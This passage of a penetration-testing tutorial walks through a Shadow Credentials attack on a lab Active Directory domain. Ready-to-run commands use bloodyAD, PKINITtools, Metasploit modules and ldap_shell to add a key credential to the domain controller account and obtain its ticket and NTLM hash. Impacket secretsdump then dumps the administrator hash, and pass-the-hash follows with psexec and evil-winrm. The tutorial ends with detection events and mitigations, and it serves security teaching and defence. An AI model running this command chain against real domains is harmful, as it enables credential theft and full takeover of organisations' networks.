<p><span style="color: #000000">Alternatively, <strong><span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/CravateRouge/bloodyAD">BloodyAD</a></span></strong> tool can be used to add Shadow Credentials to the </span><strong>msDS-KeyCredentialLink</strong><span style="color: #000000"> attribute of the target object (DC$) in the domain ignite.local</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.58 -u krishna -p Password@1 -d ignite.local add shadowCredentials DC$</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKz12bjZ1vq45zXshjNyP4330dlYDzlg8pVzSg8UWRMP1C8UZk6OneUsy9YChucK4W5EBE7cZBcfzXshDtMUPi1VjrY9NRPtiurH8vbi2pqDnG030phcFRscZRiNAgxQaqm7yNkMaUrl6ndFTnLikJx4DvEvEiGdUbyoiseG7ZzRl7ZCH8vCewFrU_B2Pg/s16000/28.png"/></span></p>
<p><span style="color: #000000">The above command generated certificate file along with private key in pem file format</span></p>
<p><span style="color: #000000">Utilize <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/dirkjanm/PKINITtools"><strong>PKINITOOLS</strong></a>  </span>to obtain a Kerberos TGT (ticket-granting-ticket) for the machine account</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 PKINITtools/gettgtpkinit.py -cert-pem CVU5WmSJ_cert.pem -key-pem CVU5WmSJ_priv.pem ignite.local/DC$ raj.ccache</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgiPLYdcrSflhPPjQcpSyBBewmtSAAnlSa_MMlKXQ8zgS0o2zuIDqata9zbi_Aa8z6WtPPow-HpGX4bTTZBu0sgDT4YV_Wj1pP2UhQ7qlDl9WuuqbmVoSVk6qEm0ppFKCAE0TorTVcd-3aSqe-V6NaRg08aHLRwU8aEvhFls_8jTQo2ek9phyQZ5uu18Yt6/s16000/29.png"/></span></p>
<p><span style="color: #000000">Set the <strong>KRB5CCNAME</strong> environment variable to point to the previously generated <strong>raj.ccache</strong> file</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">export KRB5CCNAME=raj.ccache</pre>
<p><span style="color: #000000">Utilize <strong>getnthash.py</strong> to retrieve the machine account’s NTLM hash</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python getnthash.py -key 56b304876557c0cc53482e6aaadf510058c4baf2d4be93b85b39fae511f9d2d3 ignite.local/dc$</pre>
<p><span style="color: #000000"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgCwju2sa_TilIVhVxg91IFLGK_999MOrBZvSxdhLGHCrRbwGIfTtqSYIwF78V3rTJR9kQy413Kt6aiIby7_qi6zTBMmPVcxupMLPw3JO8GHl3VMDoJ0TFY_-lclcvNvbj7sr2PwXebMqD9ub6x0UYbqzScRim214_lk-wFEaWkWdEx91RwfYXGRmL8QFYa/s16000/30.png"/><br/>
</strong></span></p>
<h4><span style="color: #000000">Metasploit</span></h4>
<p><span style="color: #000000">This module can read and write the necessary LDAP attributes to configure a particular account with a Key Credential Link. This allows weaponizing write access to a user account by adding a certificate that can subsequently be used to authenticate. In order for this to succeed, the authenticated user must have write access to the target object (the object specified in TARGET_USER).</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/ldap/shadow_credentials
set rhosts 192.168.1.58
set username krishna
set password Password@1
set domain ignite.local
set target_user dc$
set rport 636
set ssl true
set action add
run</pre>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhjyrvBNH3aRUMoJw1HV0JtHlox0rN-Y-b_3BuCtPslKbic8_a8vn-tJb9plUBlFIHy9yzEbJVwh24JcsXuAI3obra6kD4Fj_hubrSeBvCNDEhrlTQgnFYLEmS_G3JTgoAGyUK2tASJ5KbxfiCf_eZNbghK8d8LwZkfCKkTT6-TfE2Q9xGHUBOR0YJvZC4X/s16000/35.png"/></strong></span></p>
<p><span style="color: #000000">Certificate file is stored in the /.msf4/loot folder. Since the file name is too long we can rename it for our convenience.</span></p>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXV0gZ2Hi6W5pueX1D91rGW84Abq48pcunmeG-YNNDx2_vaTaoGg0NDwR_5_lbiZ9vSvh1n5AkwHbvzQZ1RqRy-0HCh16l8VI2HS2chIlyT2jeDgtLL7x0MmTj8UobeOxgtMloie1BqySBNUTjZhXbsOqtXNPex0TFVtd4FmzoUOgYbaM0joDf5r9wYtFB/s16000/36.png"/></strong></span></p>
<p><span style="color: #000000">The <strong>auxiliary/admin/kerberos/get_ticket</strong> module can be used to request TGT/TGS tickets from the KDC.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/kerberos/get_ticket
set rhosts 192.168.1.58
set action GET_HASH
set domain ignite.local
set username dc$
set cert_file /root/.msf4/loot/dc.pfx
run</pre>
<h4><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjf4DNqTmOSwsnvj0b0u7tTalDnv4KyYMGp4uVQmfkSgYyFujRAg9Ip5nUgz7sk1WxJpSPQZBeKzCAh2vjWNgOEkjf2ixlhquJhftQqPG_1z7tNGZTLZjVIk-dFq7g-gA7YbrqZmEFHM37ObIgp8U4QMF5NMox0x2IR7o-p07u8_G6McNLnb_WZSa6dGM5M/s16000/37.png"/></strong></h4>
<h4><span style="color: #000000">Ldap_shell</span></h4>
<p><span style="color: #000000">Similarly, you can achieve this using <code data-start="1039" data-end="1051">ldap_shell</code>.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Ldap_shell ignite.local/krishna:Password@1 -dc-ip 192.168.1.58</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3QgAPQpf36_eW7dPvFBfSQV0UkJOtVlmdhikocKNjjFrfphAWMFaFNt5YW2BQ-WrH21P30teqTPm_DujD0rxDlcrADL51TcLWqirlyWnxpUJMZ-Nailtm21bMVR63lp1A5zCrwKx5UInIsnI899m_ESwV24qoGtgDFlQMloJ6v0Rci3ti769q8xSWMeM9/s16000/38.png"/></span></p>
<h3><span style="color: #800000">Post-Exploitation</span></h3>
<p><span style="color: #000000">Using DC machine hash, dump the administrator NTLM hashes from the domain controller. And then perform lateral movement using psexec or evil-winrm.</span></p>
<h4><span style="color: #000000">Impacket -psexec</span></h4>
<p><span style="color: #000000">Using Impacket’s secretdump script to extract password hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -hashes :9df8e4935c53f1a8a007dad9a96232e3 'ignite/dc$@ignite.local' -just-dc-user administrator</pre>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKMQSHxXswfyAfpKP-VJC0icOIuzGBpE-EIkUh-JUHnZRehJXdXa-SSRec6J_rbjhtH1l2dOcRgzwVRfhAbGfZY3wtLZATvp15qcitPhKJ8ClOVxng0rlpw-YhIA_Bs-OvdwkGnoLsVkX5SF_rRObFJuMsks-aNiIo2VzMfqhEcxif8rzZS-BJvV0biS-g/s16000/49.png"/></strong></span></p>
<p><span style="color: #000000">Use Impacket’s psexec module to gain access using pass-the-hash technique</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-psexec -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/administrator@192.168.1.58</pre>
<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0l0TnrmwRtneJB2X5VUcXejqnBRQdcTFOBx6gVnAPT9A3E8Bdx1YhTbTYGRbELgOEaAieoVEkv2LXjjGpxQGtc31Eh1fCzqGJ_Ekz3IN6aHmP1PvBptRj4AXgmxQ8nr6Y2tG5K2vYFnzCtRlTHBeOyyHGddZEw_3SFckcUxzZruuM9tlLXHe0tc6YNEt3/s16000/50.png"/></strong></span></p>
<h4><span style="color: #000000">Evil-winrm</span></h4>
<p><span style="color: #000000">Another option is to use <code data-start="1086" data-end="1098">evil-winrm</code> to perform the same action.</span></p>
<p><span style="color: #000000">Using Impacket’s secretdump script to extract password hashes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump -hashes :9df8e4935c53f1a8a007dad9a96232e3 'ignite/dc$@ignite.local' -just-dc-user administrator</pre>
<p><span style="color: #000000">Use evil-winrm tool to gain access using pass-the-hash technique</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 192.168.1.58 -u administrator -H 32196b56ffe6f45e294117b91a83bf38</pre>
<p><span style="color: #000000"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg2rnt2cQp5lwg-L0pGH0t6h81B1OyGiUVAocPA0E_D_K_kdBQa8rwTHhjN0-_vPLUmlsoWr-ywc93PLqA8M8mj2EDUdcAXsnQ78JtGNWYh5Y9AVM-QfoZ9UIr2bec3D63cxBVddLO5AndxkI6l1NWbIJJIYdPKb6MSyIydObwHAgPo-3JTO8C5zk78AWYF/s16000/101.png"/></strong></span></p>
<p><span style="color: #000000">In light of this, defending against a <strong data-start="1476" data-end="1505">Shadow Credentials attack</strong> requires both proactive monitoring and understanding of how certificate-based authentication interacts with AD object permissions.</span></p>
<h3><span style="color: #800000">Detection &amp; Mitigation</span></h3>
<h3><span style="color: #000000">Detection</span></h3>
<h4><span style="color: #000000">Kerberos Authentication Ticket (TGT) Request</span></h4>
<ul>
<li><span style="color: #000000"><strong>Event: 4768</strong> – Kerberos Authentication Ticket (TGT) was requested</span></li>
<li><span style="color: #000000"><strong>Anomaly:</strong> If PKINIT authentication (Public Key Cryptography for Initial Authentication in Kerberos) is uncommon in the environment or not typically used for the target account, it may indicate suspicious behavior.</span></li>
<li><span style="color: #000000"><strong>Key Indicator:</strong> Look for events where Certificate Information attributes are not blank in the TGT request. This may suggest the use of certificates for authentication, potentially pointing to shadow credential abuse or malicious activity.</span></li>
<li><span style="color: #000000"><strong>Action:</strong> Investigate accounts that request a TGT using certificate-based authentication in environments where such usage is uncommon.<br/>
</span></li>
</ul>
<h4><span style="color: #000000">Active Directory Object Modification</span></h4>
<ul>
<li><span style="color: #000000"><strong>Event: 5136</strong> – Directory Service Object Was Modified</span></li>
<li><span style="color: #000000"><strong>Anomaly:</strong> Notably, if a System Access Control List (SACL) audits modifications to Active Directory objects for the targeted account, the system logs an event when it modifies an object (such as a user or device account).<br/>
</span></li>
<li><span style="color: #000000"><strong>Key Indicator:</strong> Look for modifications to the <strong>msDS-KeyCredentialLink</strong> attribute, which links keys to user or service accounts. If the modification is performed by an account other than the legitimate Azure AD Connect synchronization account or the ADFS service account, this could signal suspicious activity.</span></li>
<li><span style="color: #000000"><strong>Action:</strong> Investigate changes to the <strong>msDS-KeyCredentialLink</strong>. Treat unauthorized modifications as potential indicators of shadow credentials tampering, especially when accounts not typically involved in key provisioning—like Azure AD Connect or ADFS service accounts—perform them.</span></li>
</ul>
<p><span style="color: #000000">By monitoring these key events, you can effectively detect shadow credential attacks and respond to potential security breaches in your environment.</span></p>
<h3><span style="color: #000000">Mitigation</span></h3>
<p><span style="color: #000000"><strong>Regular Audits and Compliance Checks:</strong> Regularly audit AD accounts and their attributes to detect shadow credentials early. Compliance checks should make sure that all key credentials are valid and necessary. It’s also important to know how normal key credentials are stored, especially for third-party systems. This will help in identifying suspicious keys.</span></p>
<p><span style="color: #000000"><strong>Implementing Strong Access Controls:</strong> Make sure only authorized personnel can modify important attributes like <strong>msDS-KeyCredentialLink</strong> by enforcing strict access controls. Use Role-Based Access Control (RBAC) to limit who has these privileges. Securing these accounts is crucial because attackers could use them without raising suspicion.</span></p>
<p><span style="color: #000000"><strong>Multi-Factor Authentication (MFA):</strong> Implement MFA whenever possible to add an extra layer of security. This helps reduce the reliance on just one authentication method, making it harder for rogue key credentials to be used.</span></p>
<p><span style="color: #000000"><strong>Periodic Key Rotation:</strong> Rotate keys and credentials regularly to limit how long attackers can use unauthorized shadow credentials. Regular rotation helps minimize the impact of shadow credentials added without permission.<br/>
</span></p>
<p><span style="color: #000000">In conclusion, Understanding the Shadow Credentials attack is crucial for strengthening Active Directory defenses against PKINIT and KeyCredential abuse.<br/>
</span></p>
<p><span style="color: #000000"><strong>Author</strong>: Komal Singh is a Cyber Security Researcher and Technical Content Writer, she is a completely enthusiastic pentester and Security Analyst at Ignite Technologies. Contact</span> <span style="color: #0000ff"><a style="color: #0000ff" href="https://www.linkedin.com/in/komal--rajput/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
